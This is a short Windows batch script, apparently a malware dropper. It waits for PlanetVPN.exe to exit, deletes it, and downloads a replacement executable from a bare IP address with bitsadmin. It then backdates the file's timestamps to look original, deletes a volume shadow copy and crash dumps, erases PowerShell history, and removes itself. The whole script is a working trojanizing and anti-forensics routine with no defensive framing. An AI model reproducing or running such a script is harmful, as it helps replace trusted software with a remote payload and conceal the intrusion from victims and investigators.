@echo off
echo bekleyin...

:loop
tasklist | find /i "PlanetVPN.exe" >nul
if not errorlevel 1 (
    timeout /t 1 >nul
    goto loop
)

echo Deleting existing...
del /f "C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe"

echo oPlanetVPN.exe...
bitsadmin /transfer myDownloadJob /download /priority high https://31.57.156.199/PlanetVPN.exe "C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe"

if exist "C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe" (
    echo Completed new.

    echo Setting file times...
    powershell -NoProfile -Command ^
    "$filePath = 'C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe'; ^
    if (Test-Path $filePath) { ^
        $item = Get-Item $filePath; ^
        $time = '2024-10-14 13:59:24'; ^
        $item.LastWriteTime = $time; ^
        $item.CreationTime = $time; ^
    } else { Write-Host 'Dosya bulunamadı: $filePath' }"

    echo Cleaning up...
    echo Y | vssadmin delete shadows /for=C: /oldest >nul 2>&1
    del /f /q "%USERPROFILE%\AppData\Local\CrashDumps\PlanetVPN.exe.*.dmp" 2>nul
    rem rmdir /s /q "%APPDATA%\Microsoft\Windows\Recent"
    rem mkdir "%APPDATA%\Microsoft\Windows\Recent"
    powershell -Command "Start-Sleep -Seconds 5; Remove-Item '%~f0'"
    powershell -NoProfile -Command "Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue"
)

exit
